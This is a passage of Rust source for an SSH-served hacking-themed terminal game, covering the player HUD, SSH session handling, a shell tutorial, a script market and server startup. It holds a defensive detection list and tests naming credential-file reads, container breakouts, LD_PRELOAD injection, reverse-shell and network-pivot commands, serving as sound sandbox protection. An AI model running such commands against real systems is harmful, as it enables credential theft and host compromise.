                        ExperienceTier::Gud => "Gud",
                        ExperienceTier::Hardcore => "Hardcore",
                    },
                    format!("{} NC", p.wallet),
                    format!("{}d", p.streak),
                    self.mode.as_label().to_string(),
                    p.reputation,
                    match p.combat_stance {
                        CombatStance::Pve => "PvE",
                        CombatStance::Pvp => "PvP",
                    },
                    p.deaths,
                )
            } else {
                (
                    "unknown".to_string(),
                    "Noob",
                    "0 NC".to_string(),
                    "0d".to_string(),
                    "TRAINING".to_string(),
                    0_i64,
                    "PvE",
                    0_u32,
                )
            };

        let stance_dot = status_dot(
            m.clone(),
            if stance_str == "PvP" {
                StatusState::Alert
            } else {
                StatusState::Ok
            },
            uc,
        );
        let rep_bar = progress_meter(m.clone(), (rep.min(1000) * 100 / 1000) as u8, 8);

        // Top stats via two_column_kv (already padded to inner_width).
        let pairs: Vec<(&str, &str)> = vec![
            ("Alias", &alias),
            ("Mode", &mode_label),
            ("Tier", tier),
            ("Wallet", &wallet),
        ];
        let mut body = two_column_kv(m.clone(), &pairs, cols);

        // Streak / Deaths / Stance — pad to inner_width.
        let streak_line =
            format!("Streak: {streak}    Deaths: {deaths}    Stance: {stance_dot} {stance_str}");
        body.push(pad_visible(&streak_line, inner_width));

        // Rep bar — pad to inner_width.
        let rep_line = format!("Rep: {rep} {rep_bar}");
        body.push(pad_visible(&rep_line, inner_width));

        // Divider — exactly inner_width using panel_divider_line.
        body.push(panel_divider_line(cols, uc));

        // Progress section.
        let (completed, active, campaign_ch, tutorial_step, unread_mail) =
            if let Some(ref p) = self.profile {
                (
                    p.completed_missions.len(),
                    p.active_missions.len(),
                    p.campaign_chapter,
                    p.tutorial_step,
                    p.mailbox.iter().filter(|m| !m.read).count(),
                )
            } else {
                (0, 0, 0, 0, 0)
            };

        let mission_pct = if completed + active > 0 {
            ((completed * 100) / (completed + active).max(1)) as u8
        } else {
            0
        };
        let mission_bar = progress_meter(m.clone(), mission_pct, 10);
        body.push(pad_visible(
            &format!("Missions: {completed} done / {active} active  {mission_bar}"),
            inner_width,
        ));

        let campaign_pct = ((campaign_ch as u16 * 100) / 12) as u8;
        let campaign_bar = progress_meter(m.clone(), campaign_pct, 10);
        body.push(pad_visible(
            &format!("Campaign: Ch.{campaign_ch}/12  {campaign_bar}"),
            inner_width,
        ));

        let tutorial_msg = if tutorial_step >= 7 {
            "COMPLETE".to_string()
        } else if tutorial_step == 0 {
            "not started".to_string()
        } else {
            format!("Step {tutorial_step}/7")
        };
        body.push(pad_visible(
            &format!("Tutorial: {tutorial_msg}"),
            inner_width,
        ));

        let mail_dot = status_dot(
            m.clone(),
            if unread_mail > 0 {
                StatusState::Warn
            } else {
                StatusState::Inactive
            },
            uc,
        );
        body.push(pad_visible(
            &format!("Mail: {mail_dot} {unread_mail} unread"),
            inner_width,
        ));

        titled_panel(m, "OPERATIVE HUD", &body, cols, uc)
    }

    /// Contextual quick-start hint based on player progress.
    fn contextual_hint(&self) -> String {
        let theme = Theme::for_mode(self.mode.clone());
        if let Some(ref p) = self.profile {
            if p.tutorial_step == 0 {
                return format!(
                    "  {a}New operative?{R} Run {hl}tutorial start{R} for guided onboarding.\n\
                     {d}  Or try: help | briefing | missions | guide shell{R}\n",
                    a = theme.accent,
                    hl = theme.highlight,
                    d = theme.dim,
                    R = RESET,
                );
            }
            if p.tutorial_step < 7 {
                return format!(
                    "  {a}Tutorial in progress{R} (step {s}/7). Run {hl}tutorial next{R} to continue.\n",
                    a = theme.accent, s = p.tutorial_step, hl = theme.highlight, R = RESET,
                );
            }
            if p.completed_missions.len() < 3 {
                return format!(
                    "  {a}Ready for missions.{R} Run {hl}missions{R} to see the board, {hl}briefing{R} for story context.\n",
                    a = theme.accent, hl = theme.highlight, R = RESET,
                );
            }
            if p.campaign_chapter > 0 && p.campaign_chapter < 12 {
                return format!(
                    "  {a}Campaign Ch.{c} active.{R} Run {hl}campaign{R} for current objectives.\n",
                    a = theme.accent,
                    c = p.campaign_chapter,
                    hl = theme.highlight,
                    R = RESET,
                );
            }
            format!(
                "  Run {hl}help{R} for commands, {hl}status{R} for full profile, {hl}daily{R} for today's rewards.\n",
                hl = theme.highlight, R = RESET,
            )
        } else {
            format!(
                "  {a}New operative?{R} Run {hl}tutorial start{R} for guided onboarding.\n",
                a = theme.accent,
                hl = theme.highlight,
                R = RESET,
            )
        }
    }

    fn prompt(&self) -> String {
        let base = self
            .shell_state
            .as_ref()
            .map(ShellState::prompt)
            .unwrap_or_else(|| "guest@boot:/$ ".to_owned());
        if self.supports_ansi {
            let theme = Theme::for_mode(self.mode.clone());
            let tag = match self.mode {
                Mode::Training => "SIM",
                Mode::NetCity => "NET",
                Mode::Redline => "RED",
            };
            format!("{}[{}]{} {}", theme.primary, tag, RESET, base)
        } else {
            let tag = match self.mode {
                Mode::Training => "[SIM]",
                Mode::NetCity => "[NET]",
                Mode::Redline => "[RED]",
            };
            format!("{} {}", tag, base)
        }
    }

    fn render_mode_banner(&self, mode: Mode) -> String {
        if self.pty_columns > 0 && self.pty_columns < 36 {
            let theme = Theme::for_mode(mode.clone());
            return format!("{}[ {} ]{}", theme.primary, mode.as_label(), RESET);
        }
        mode_banner_adaptive(
            mode,
            self.flash_enabled,
            self.pty_columns.max(20) as usize,
            self.supports_unicode,
        )
    }

    fn render_section_banner(&self, title: &str) -> String {
        section_banner_adaptive(
            self.mode.clone(),
            title,
            self.pty_columns.max(20) as usize,
            self.supports_unicode,
        )
    }

    fn render_for_client(&self, text: &str) -> String {
        let raw = if self.supports_ansi {
            text.to_owned()
        } else {
            strip_ansi_sequences(text)
        };
        normalize_line_endings(&raw)
    }

    fn send_text(
        &self,
        session: &mut server::Session,
        channel: ChannelId,
        text: &str,
    ) -> Result<(), anyhow::Error> {
        session.data(channel, CryptoVec::from(self.render_for_client(text)))?;
        Ok(())
    }

    async fn submit_line(
        &mut self,
        session: &mut server::Session,
        channel: ChannelId,
    ) -> Result<bool, anyhow::Error> {
        if self.line_buffer.is_empty() {
            self.send_text(session, channel, "\n")?;
            self.send_text(session, channel, &self.prompt())?;
            return Ok(false);
        }

        let line = String::from_utf8_lossy(&self.line_buffer).to_string();
        self.line_buffer.clear();
        self.send_text(session, channel, "\n")?;

        let (out, code, should_close) = match self.run_line(&line).await {
            Ok(v) => v,
            Err(err) => (format!("{err}\n"), 1, false),
        };

        if !out.is_empty() {
            self.send_text(session, channel, &out)?;
        }
        session.exit_status_request(channel, code as u32)?;

        if should_close {
            session.eof(channel)?;
            session.close(channel)?;
            return Ok(true);
        }

        self.send_text(session, channel, &self.prompt())?;
        Ok(false)
    }
}

impl server::Server for GameServer {
    type Handler = GameSession;

    fn new_client(&mut self, peer_addr: Option<SocketAddr>) -> Self::Handler {
        GameSession::new(self.app.clone(), peer_addr)
    }

    fn handle_session_error(&mut self, error: <Self::Handler as server::Handler>::Error) {
        warn!("session error: {error:?}");
    }
}

impl server::Handler for GameSession {
    type Error = anyhow::Error;

    async fn auth_none(&mut self, user: &str) -> Result<server::Auth, Self::Error> {
        self.username = sanitize_prompt_user(user);
        Ok(server::Auth::Accept)
    }

    async fn auth_publickey_offered(
        &mut self,
        user: &str,
        public_key: &russh::keys::ssh_key::PublicKey,
    ) -> Result<server::Auth, Self::Error> {
        self.username = sanitize_prompt_user(user);
        let fp = sha256_hex(&format!("{public_key:?}"));
        self.offered_fingerprints.push(format!("SHA256:{fp}"));
        Ok(server::Auth::Accept)
    }

    async fn auth_publickey(
        &mut self,
        user: &str,
        _public_key: &russh::keys::ssh_key::PublicKey,
    ) -> Result<server::Auth, Self::Error> {
        self.username = sanitize_prompt_user(user);
        Ok(server::Auth::Accept)
    }

    async fn auth_succeeded(&mut self, _session: &mut server::Session) -> Result<(), Self::Error> {
        if let Err(err) = self.initialize_identity().await {
            error!("failed to init identity: {err:#}");
        }
        Ok(())
    }

    async fn channel_open_session(
        &mut self,
        _channel: Channel<Msg>,
        _session: &mut server::Session,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }

    async fn pty_request(
        &mut self,
        channel: ChannelId,
        term: &str,
        col_width: u32,
        _row_height: u32,
        _pix_width: u32,
        _pix_height: u32,
        _modes: &[(russh::Pty, u32)],
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        self.supports_ansi = terminal_supports_ansi(term);
        self.supports_unicode = terminal_supports_unicode(term);
        self.pty_columns = col_width.max(20);
        session.channel_success(channel)?;
        Ok(())
    }

    async fn env_request(
        &mut self,
        channel: ChannelId,
        variable_name: &str,
        variable_value: &str,
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        let var = variable_name.to_ascii_uppercase();
        if (var == "LANG" || var == "LC_ALL") && !locale_supports_unicode(variable_value) {
            self.supports_unicode = false;
        }
        session.channel_success(channel)?;
        Ok(())
    }

    async fn window_change_request(
        &mut self,
        channel: ChannelId,
        col_width: u32,
        _row_height: u32,
        _pix_width: u32,
        _pix_height: u32,
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        self.pty_columns = col_width.max(20);
        session.channel_success(channel)?;
        Ok(())
    }

    async fn shell_request(
        &mut self,
        channel: ChannelId,
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        session.channel_success(channel)?;
        self.send_text(session, channel, &self.welcome_banner())?;
        self.send_text(session, channel, &self.prompt())?;
        Ok(())
    }

    async fn exec_request(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        session.channel_success(channel)?;
        let line = String::from_utf8_lossy(data).trim().to_owned();
        let (out, code, _) = self
            .run_line(&line)
            .await
            .unwrap_or_else(|err| (format!("Execution error: {err}\n"), 1, false));
        self.send_text(session, channel, &out)?;
        session.exit_status_request(channel, code as u32)?;
        session.eof(channel)?;
        session.close(channel)?;
        Ok(())
    }

    async fn data(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        for byte in data {
            match *byte {
                b'\r' => {
                    self.pending_lf_after_cr = true;
                    self.escape_sequence_remaining = 0;
                    if self.submit_line(session, channel).await? {
                        return Ok(());
                    }
                }
                b'\n' => {
                    if self.pending_lf_after_cr {
                        self.pending_lf_after_cr = false;
                        continue;
                    }
                    self.escape_sequence_remaining = 0;
                    if self.submit_line(session, channel).await? {
                        return Ok(());
                    }
                }
                3 => {
                    self.pending_lf_after_cr = false;
                    self.escape_sequence_remaining = 0;
                    self.line_buffer.clear();
                    self.send_text(session, channel, "^C\n")?;
                    self.send_text(session, channel, &self.prompt())?;
                }
                127 | 8 => {
                    self.pending_lf_after_cr = false;
                    self.escape_sequence_remaining = 0;
                    if !self.line_buffer.is_empty() {
                        self.line_buffer.pop();
                        session.data(channel, CryptoVec::from("\x08 \x08"))?;
                    }
                }
                0x1b => {
                    self.pending_lf_after_cr = false;
                    self.escape_sequence_remaining = 8;
                }
                b => {
                    self.pending_lf_after_cr = false;
                    if self.escape_sequence_remaining > 0 {
                        self.escape_sequence_remaining =
                            self.escape_sequence_remaining.saturating_sub(1);
                        if b.is_ascii_alphabetic() || b == b'~' {
                            self.escape_sequence_remaining = 0;
                        }
                        continue;
                    }
                    self.line_buffer.push(b);
                    session.data(channel, CryptoVec::from(vec![b]))?;
                }
            }
        }
        Ok(())
    }
}

fn sanitize_prompt_user(input: &str) -> String {
    let base = strip_ansi_sequences(input);
    let short = base.split('@').next().unwrap_or_default();
    let cleaned = short
        .chars()
        .take(24)
        .filter(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_' | '.'))
        .collect::<String>();
    if cleaned.is_empty() {
        "guest".to_owned()
    } else {
        cleaned
    }
}

fn terminal_supports_ansi(term: &str) -> bool {
    let t = term.trim().to_ascii_lowercase();
    !t.is_empty() && t != "dumb" && t != "cons25"
}

fn terminal_supports_unicode(term: &str) -> bool {
    let t = term.trim().to_ascii_lowercase();
    if t.is_empty() {
        return false;
    }
    !matches!(
        t.as_str(),
        "dumb" | "cons25" | "linux" | "ansi" | "vt100" | "vt102" | "vt220"
    )
}

fn locale_supports_unicode(locale: &str) -> bool {
    let l = locale.trim().to_ascii_lowercase();
    l.contains("utf-8") || l.contains("utf8")
}

fn strip_ansi_sequences(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0usize;
    while i < bytes.len() {
        if bytes[i] != 0x1b {
            out.push(bytes[i]);
            i += 1;
            continue;
        }

        i += 1;
        if i >= bytes.len() {
            break;
        }
        if bytes[i] == b'[' {
            i += 1;
            while i < bytes.len() {
                let b = bytes[i];
                i += 1;
                if (b'@'..=b'~').contains(&b) {
                    break;
                }
            }
            continue;
        }

        i += 1;
    }

    String::from_utf8_lossy(&out).into_owned()
}

fn normalize_line_endings(input: &str) -> String {
    let mut out = String::with_capacity(input.len() + 8);
    let mut prev_was_cr = false;
    for ch in input.chars() {
        match ch {
            '\n' => {
                if !prev_was_cr {
                    out.push('\r');
                }
                out.push('\n');
                prev_was_cr = false;
            }
            '\r' => {
                out.push('\r');
                prev_was_cr = true;
            }
            _ => {
                out.push(ch);
                prev_was_cr = false;
            }
        }
    }
    out
}

fn escape_attempt_reason(line: &str) -> Option<&'static str> {
    let lower = line.to_ascii_lowercase();
    let trimmed = lower.trim();
    let checks: [(&str, &str); 20] = [
        ("std::process::command", "forbidden host process API probe"),
        (
            "tokio::process::command",
            "forbidden async process API probe",
        ),
        ("/var/run/docker.sock", "container socket breakout probe"),
        ("/proc/", "host filesystem probe"),
        ("/etc/passwd", "host credential probe"),
        ("/root/.ssh", "root credential probe"),
        ("powershell.exe", "host shell invocation attempt"),
        ("pwsh -", "host shell invocation attempt"),
        ("cmd.exe /c", "host shell invocation attempt"),
        ("/etc/shadow", "host shadow file probe"),
        ("/etc/sudoers", "host privilege escalation probe"),
        ("/etc/crontab", "host cron probe"),
        ("/dev/mem", "host memory device probe"),
        ("ld_preload", "dynamic linker injection probe"),
        ("ld_library_path=/", "dynamic linker path injection probe"),
        ("/proc/self", "host process self-probe"),
        ("mkfifo", "named pipe reverse shell probe"),
        ("base64 -d", "encoded payload execution probe"),
        ("/dev/tcp/", "bash tcp redirect probe"),
        ("/dev/udp/", "bash udp redirect probe"),
    ];

    for (needle, reason) in checks {
        if trimmed.contains(needle) {
            return Some(reason);
        }
    }

    let mut normalized = String::with_capacity(trimmed.len());
    for ch in trimmed.chars() {
        if matches!(ch, '|' | ';' | '&') {
            normalized.push('\n');
        } else {
            normalized.push(ch);
        }
    }

    for segment in normalized.lines() {
        let mut parts = segment.split_whitespace();
        let Some(cmd) = parts.next() else {
            continue;
        };
        let rest = parts.collect::<Vec<_>>();
        match cmd {
            "/bin/bash" | "/bin/sh" | "/bin/zsh" | "powershell" | "powershell.exe" | "pwsh"
            | "cmd" | "cmd.exe" | "zsh" | "fish" => {
                return Some("host shell invocation attempt");
            }
            "bash" | "sh" => {
                if rest.first() == Some(&"-c") {
                    return Some("host shell execution attempt");
                }
                return Some("host shell escalation attempt");
            }
            "python" | "python3" | "perl" | "ruby" | "node" | "lua" | "php" => {
                if rest.contains(&"-c")
                    || rest.contains(&"-e")
                    || rest.contains(&"-r")
                    || rest.contains(&"--eval")
                {
                    return Some("runtime escape attempt");
                }
                return Some("runtime interpreter launch attempt");
            }
            "sudo" | "su" => return Some("privilege escalation attempt"),
            "docker" | "podman" => return Some("container breakout tooling probe"),
            "nsenter" => return Some("namespace escape attempt"),
            "chroot" => return Some("chroot escape attempt"),
            "systemctl" => return Some("host service control probe"),
            "nc" | "ncat" | "netcat" | "socat" => return Some("network pivot attempt"),
            "nmap" | "masscan" | "zmap" => return Some("network scan attempt"),
            "ssh" | "scp" | "sftp" | "telnet" | "ftp" | "rsh" | "rlogin" => {
                return Some("network pivot attempt");
            }
            "curl" | "wget" => {
                if rest
                    .iter()
                    .any(|arg| arg.starts_with("http://") || arg.starts_with("https://"))
                {
                    return Some("external host/network call attempt");
                }
            }
            _ => {}
        }
    }

    None
}

fn is_game_command(cmd: &str) -> bool {
    matches!(
        cmd,
        "help"
            | "guide"
            | "briefing"
            | "tutorial"
            | "missions"
            | "accept"
            | "submit"
            | "inventory"
            | "shop"
            | "auction"
            | "chat"
            | "mail"
            | "party"
            | "dossier"
            | "stance"
            | "hack"
            | "history"
            | "eva"
            | "campaign"
            | "mode"
            | "gate"
            | "keyvault"
            | "settings"
            | "status"
            | "events"
            | "leaderboard"
            | "scripts"
            | "daily"
            | "tier"
            | "pvp"
            | "relay"
    )
}

/// Render the lesson text for a single interactive tutorial step.
fn render_tutorial_step(step: u8, banner: &str) -> String {
    let mut out = banner.to_owned();
    out.push_str(&format!("Step {}/6\n\n", step));
    match step {
        1 => {
            out.push_str("WHERE AM I?\n");
            out.push_str("Every shell session starts somewhere. Find out where you are.\n\n");
            out.push_str(
                "  Concept: pwd (print working directory) shows your current location.\n\n",
            );
            out.push_str("  Run this:\n");
            out.push_str("    pwd\n\n");
            out.push_str("Then run `tutorial next` to advance.\n");
        }
        2 => {
            out.push_str("LOOK AROUND\n");
            out.push_str("Now see what's in the /missions directory.\n\n");
            out.push_str("  Concept: ls (list) shows the files and folders in a directory.\n\n");
            out.push_str("  Run this:\n");
            out.push_str("    ls /missions\n\n");
            out.push_str("Then run `tutorial next` to advance.\n");
        }
        3 => {
            out.push_str("READ A FILE\n");
            out.push_str("Read the story file to understand what happened to Ghost Rail.\n\n");
            out.push_str("  Concept: cat (concatenate) prints the entire contents of a file.\n\n");
            out.push_str("  Run this:\n");
            out.push_str("    cat /missions/story-so-far.txt\n\n");
            out.push_str("Then run `tutorial next` to advance.\n");
        }
        4 => {
            out.push_str("SEARCH FOR A WORD\n");
            out.push_str("The gateway log is noisy. Find just the lines with 'token' in them.\n\n");
            out.push_str("  Concept: grep PATTERN FILE shows only lines containing PATTERN.\n\n");
            out.push_str("  Run this:\n");
            out.push_str("    grep token /logs/neon-gateway.log\n\n");
            out.push_str("Then run `tutorial next` to advance.\n");
        }
        5 => {
            out.push_str("COUNT RESULTS WITH A PIPE\n");
            out.push_str("How many token lines are there? Connect grep to wc (word count).\n\n");
            out.push_str(
                "  Concept: The | symbol sends the output of one command into the next.\n",
            );
            out.push_str("  wc -l counts lines.\n\n");
            out.push_str("  Run this:\n");
            out.push_str("    cat /logs/neon-gateway.log | grep token | wc -l\n\n");
            out.push_str("Then run `tutorial next` to advance.\n");
        }
        6 => {
            out.push_str("SAVE YOUR WORK\n");
            out.push_str("Save the warnings to a file so you can review them later.\n\n");
            out.push_str("  Concept: > redirects output into a file (overwriting it).\n");
            out.push_str("  >> appends to the end instead of overwriting.\n\n");
            out.push_str("  Run this:\n");
            out.push_str("    grep WARN /logs/neon-gateway.log > /tmp/warnings.txt\n\n");
            out.push_str("Then run `tutorial next` to complete the tutorial.\n");
        }
        _ => {
            out.push_str("Invalid step. Run `tutorial reset` to start over.\n");
        }
    }
    out
}

/// Check whether the player has completed a tutorial step based on their command log.
fn validate_tutorial_step(step: u8, log: Option<&HashMap<String, String>>) -> bool {
    let log = match log {
        Some(l) => l,
        None => return false,
    };
    // Concatenate all command outputs for substring search
    let all_output: String = log.values().cloned().collect::<Vec<_>>().join("\n");
    let all_commands: String = log.keys().cloned().collect::<Vec<_>>().join("\n");
    match step {
        1 => {
            // pwd: output should contain /
            log.keys().any(|k| k.starts_with("pwd")) || all_output.contains('/')
        }
        2 => {
            // ls /missions: output should contain rookie-ops
            all_output.contains("rookie-ops")
                || all_commands.contains("ls /missions")
                || all_commands.contains("ls /missions/")
        }
        3 => {
            // cat a file: output should mention Ghost Rail
            all_output.contains("Ghost Rail") || all_output.contains("ghost-rail")
        }
        4 => {
            // grep token: output should contain token
            all_commands.contains("grep token")
                || all_commands.contains("grep WARN")
                || (all_output.contains("token") && all_commands.contains("grep"))
        }
        5 => {
            // pipe: must have used | (evidenced by wc -l output which is a number)
            all_commands.contains('|') || all_commands.contains("wc")
        }
        6 => {
            // redirect: must have used > (command contains >)
            all_commands.contains('>') || log.keys().any(|k| k.contains("> /tmp/"))
        }
        _ => false,
    }
}

fn mission_track_label(code: &str, required: bool, starter: bool) -> &'static str {
    if required {
        "required"
    } else if world::TUTORIAL_CODES.contains(&code) {
        "tutorial"
    } else if starter {
        "starter"
    } else if world::INTERMEDIATE_CODES.contains(&code) {
        "intermed"
    } else if world::EXPERT_CODES.contains(&code) {
        "expert"
    } else {
        "advanced"
    }
}

struct ScriptMarketEntry {
    name: &'static str,
    description: &'static str,
    source: &'static str,
}

fn script_market() -> &'static [ScriptMarketEntry] {
    &[
        ScriptMarketEntry {
            name: "node-scan",
            description: "List visible NetCity nodes",
            source: "let nodes = scan_nodes(); for n in nodes { print(n); }",
        },
        ScriptMarketEntry {
            name: "token-hunt",
            description: "Extract token lines from mission logs",
            source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "token"));"#,
        },
        ScriptMarketEntry {
            name: "warn-trace",
            description: "Trace warning signals in gateway logs",
            source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "WARN"));"#,
        },
        ScriptMarketEntry {
            name: "error-pulse",
            description: "Surface ERROR entries from gateway logs",
            source: r#"let data = read_virtual("/logs/neon-gateway.log"); print(grep(data, "ERROR"));"#,
        },
        ScriptMarketEntry {
            name: "node-count",
            description: "Count visible nodes in the current sector",
            source: "let nodes = scan_nodes(); print(nodes.len);",
        },
        ScriptMarketEntry {
            name: "auth-sweep",
            description: "Count rejected auth attempts from auth log",
            source: r#"let data = read_virtual("/var/log/auth.log"); print(grep(data, "REJECT"));"#,
        },
        ScriptMarketEntry {
            name: "inventory-sku",
            description: "Extract SKU field from the data inventory",
            source: r#"let data = read_virtual("/data/inventory.tsv"); print(grep(data, "nb-"));"#,
        },
        ScriptMarketEntry {
            name: "error-filter",
            description: "Extract ERROR and FATAL lines from events log (regex-hunt)",
            source: r#"let data = read_virtual("/var/log/events.log"); print(grep(data, "ERROR"));"#,
        },
        ScriptMarketEntry {
            name: "top-score",
            description: "Extract top-scorer name from pipeline.csv (pipeline-pro)",
            source: r#"let data = read_virtual("/data/pipeline.csv"); print(grep(data, "neo"));"#,
        },
        ScriptMarketEntry {
            name: "config-dump",
            description: "Display current sim-config values (var-play)",
            source: r#"let data = read_virtual("/etc/sim-config"); print(data);"#,
        },
        ScriptMarketEntry {
            name: "json-keys",
            description: "Extract key names from node-status.json (json-crack)",
            source: r#"let data = read_virtual("/data/node-status.json"); print(grep(data, ":"));"#,
        },
        ScriptMarketEntry {
            name: "seq-report",
            description: "List numbered tasks from tasks.txt (seq-master)",
            source: r#"let data = read_virtual("/home/player/tasks.txt"); print(data);"#,
        },
        ScriptMarketEntry {
            name: "col-format",
            description: "Format netmap.tsv as aligned table (column-view)",
            source: r#"let data = read_virtual("/data/netmap.tsv"); print(data);"#,
        },
    ]
}

fn style_metrics(parsed: &shell::ParsedLine) -> Option<(usize, usize)> {
    if parsed.segments.is_empty() {
        return None;
    }

    let mut max_chain_depth = 0usize;
    let mut unique_tools = HashSet::new();
    for segment in &parsed.segments {
        max_chain_depth = max_chain_depth.max(segment.pipeline.commands.len());
        for cmd in &segment.pipeline.commands {
            unique_tools.insert(cmd.program.clone());
        }
    }

    if max_chain_depth < 2 && unique_tools.len() < 3 {
        return None;
    }

    Some((max_chain_depth, unique_tools.len()))
}

fn sha256_hex(input: &str) -> String {
    use sha2::{Digest, Sha256};

    let mut hasher = Sha256::new();
    hasher.update(input.as_bytes());
    format!("{:x}", hasher.finalize())
}

fn generate_admin_keypair(passphrase: &str) -> Result<(String, String)> {
    let mut rng = OsRng;
    let private = russh::keys::PrivateKey::random(&mut rng, russh::keys::Algorithm::Ed25519)?;
    let encrypted = private.encrypt(&mut rng, passphrase)?;
    let private_blob = encrypted
        .to_openssh(russh::keys::ssh_key::LineEnding::LF)?
        .to_string();
    let public_line = private.public_key().to_openssh()?;
    Ok((public_line, private_blob))
}

fn load_or_generate_host_key(path: &Path) -> Result<russh::keys::PrivateKey> {
    if let Ok(key) = russh::keys::PrivateKey::read_openssh_file(path) {
        info!(path = %path.display(), "loaded persistent SSH host key");
        return Ok(key);
    }

    let mut rng = OsRng;
    let key = russh::keys::PrivateKey::random(&mut rng, russh::keys::Algorithm::Ed25519)?;

    if let Some(parent) = path.parent() {
        if let Err(err) = std::fs::create_dir_all(parent) {
            warn!(
                path = %path.display(),
                error = ?err,
                "unable to create host key directory; using ephemeral key for this run"
            );
            return Ok(key);
        }
    }

    match key.write_openssh_file(path, russh::keys::ssh_key::LineEnding::LF) {
        Ok(()) => {
            info!(path = %path.display(), "wrote SSH host key");
            Ok(key)
        }
        Err(err) => {
            warn!(
                path = %path.display(),
                error = ?err,
                "unable to persist SSH host key; using ephemeral key for this run"
            );
            Ok(key)
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "info,ssh_hunt_server=debug".into()),
        )
        .with_target(false)
        .init();

    let config_path =
        std::env::var("GAME_CONFIG_PATH").unwrap_or_else(|_| "/data/config.yaml".to_owned());
    let admin_secret_path = std::env::var("ADMIN_SECRET_PATH")
        .unwrap_or_else(|_| "/data/secrets/admin.yaml".to_owned());
    let hidden_ops_path = std::env::var("HIDDEN_OPS_PATH")
        .unwrap_or_else(|_| "/data/secrets/hidden_ops.yaml".to_owned());
    let host_key_path = std::env::var("SSH_HOST_KEY_PATH")
        .unwrap_or_else(|_| "/data/secrets/ssh_host_ed25519".to_owned());

    let cfg = config::load_config(&config_path)?;
    let admin_secret = config::load_admin_secret(&admin_secret_path)?;
    let hidden_ops: HiddenOpsConfig = config::load_hidden_ops(&hidden_ops_path)?;

    if args.healthcheck {
        let db_url = std::env::var("DATABASE_URL").context("DATABASE_URL is required")?;
        let pool = timeout(Duration::from_secs(3), PgPool::connect(&db_url))
            .await
            .context("database healthcheck timed out")??;
        let _ping: i32 = sqlx::query_scalar("SELECT 1")
            .fetch_one(&pool)
            .await
            .context("database healthcheck query failed")?;
        println!("ok");
        return Ok(());
    }

    let db_url = std::env::var("DATABASE_URL").context("DATABASE_URL is required")?;
    let pool = PgPool::connect(&db_url).await?;
    sqlx::migrate!("../../migrations").run(&pool).await?;

    let world = Arc::new(WorldService::new(Some(pool), hidden_ops));
    let shell = Arc::new(ShellEngine::with_registry(builtins::default_registry()));
    let script = Arc::new(ScriptEngine::new(ScriptPolicy::default()));

    let app = Arc::new(AppState {
        cfg: cfg.clone(),
        world,
        shell,
        script,
        admin_secret,
    });

    let host_key = load_or_generate_host_key(Path::new(&host_key_path))
        .with_context(|| format!("unable to prepare host key at {host_key_path}"))?;

    let server_cfg = russh::server::Config {
        inactivity_timeout: Some(Duration::from_secs(3600)),
        auth_rejection_time: Duration::from_millis(250),
        auth_rejection_time_initial: Some(Duration::from_millis(0)),
        keys: vec![host_key],
        ..Default::default()
    };
    let server_cfg = Arc::new(server_cfg);

    let mut server = GameServer { app };
    let mut retry_delay = Duration::from_secs(1);
    loop {
        match TcpListener::bind(&cfg.server.listen).await {
            Ok(listener) => {
                info!(listen = %cfg.server.listen, "starting SSH-Hunt server");
                retry_delay = Duration::from_secs(1);
                match server.run_on_socket(server_cfg.clone(), &listener).await {
                    Ok(()) => warn!("server loop exited unexpectedly; restarting listener"),
                    Err(err) => error!(error = ?err, "server loop error; restarting listener"),
                }
            }
            Err(err) => {
                error!(
                    listen = %cfg.server.listen,
                    error = ?err,
                    "failed to bind SSH listener; retrying"
                );
            }
        }
        sleep(retry_delay).await;
        retry_delay = std::cmp::min(retry_delay * 2, Duration::from_secs(10));
    }

    #[allow(unreachable_code)]
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn style_metrics_requires_complexity() {
        let engine = ShellEngine::default();
        let env = HashMap::new();
        let simple = engine.parse("ls", &env).unwrap();
        assert!(style_metrics(&simple).is_none());

        let complex = engine
            .parse("cat /logs/neon-gateway.log | grep token | wc -l", &env)
            .unwrap();
        assert_eq!(style_metrics(&complex), Some((3, 3)));
    }

    #[test]
    fn intrusion_guard_flags_escape_attempts() {
        assert_eq!(
            escape_attempt_reason("bash -c 'id'"),
            Some("host shell execution attempt")
        );
        assert_eq!(
            escape_attempt_reason("pwsh --eval whoami"),
            Some("host shell invocation attempt")
        );
        assert_eq!(
            escape_attempt_reason("python3"),
            Some("runtime interpreter launch attempt")
        );
        assert_eq!(
            escape_attempt_reason("cat /var/run/docker.sock"),
            Some("container socket breakout probe")
        );
        assert_eq!(
            escape_attempt_reason("ssh admin@example.com"),
            Some("network pivot attempt")
        );
        assert_eq!(escape_attempt_reason("cat /logs/neon-gateway.log"), None);
        assert_eq!(escape_attempt_reason("echo docker"), None);
        assert_eq!(escape_attempt_reason("chat global bash -c 'id'"), None);

        // Extended pattern coverage
        assert_eq!(
            escape_attempt_reason("cat /etc/shadow"),
            Some("host shadow file probe")
        );
        assert_eq!(
            escape_attempt_reason("cat /etc/sudoers"),
            Some("host privilege escalation probe")
        );
        assert_eq!(
            escape_attempt_reason("LD_PRELOAD=/tmp/evil.so ls"),
            Some("dynamic linker injection probe")
        );
        assert_eq!(
            escape_attempt_reason("nmap -sV 10.0.0.1"),
            Some("network scan attempt")
        );
        assert_eq!(
            escape_attempt_reason("masscan --rate 1000 10.0.0.0/24"),
            Some("network scan attempt")
        );
        assert_eq!(
            escape_attempt_reason("rsh target-host"),
            Some("network pivot attempt")
        );
        assert_eq!(
            escape_attempt_reason("sudo su -"),
            Some("privilege escalation attempt")
        );
        assert_eq!(
            escape_attempt_reason("docker run --privileged alpine"),
            Some("container breakout tooling probe")
        );

        // New pattern coverage
        assert_eq!(
